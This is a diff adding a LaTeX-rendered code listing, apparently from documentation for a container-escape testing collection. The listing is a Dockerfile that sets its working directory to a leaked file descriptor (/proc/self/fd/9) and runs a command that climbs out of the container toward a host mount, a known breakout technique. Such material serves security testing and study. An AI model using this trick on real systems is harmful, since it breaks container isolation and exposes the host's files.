@@ -1,0 +1,6 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{+w}{    }\PYG{l+lScalar+lScalarPlain}{FROM ubuntu:20.04}
+\PYG{+w}{    }\PYG{l+lScalar+lScalarPlain}{RUN apt\PYGZhy{}get update \PYGZhy{}y}
+\PYG{+w}{    }\PYG{l+lScalar+lScalarPlain}{WORKDIR /proc/self/fd/9}
+\PYG{+w}{    }\PYG{l+lScalar+lScalarPlain}{CMD [\PYGZdq{}bash\PYGZdq{}, \PYGZdq{}\PYGZhy{}c\PYGZdq{}, \PYGZdq{}ls ../../../../../houdini/tricks/HostMount\PYGZdq{}]}
+\end{Verbatim}
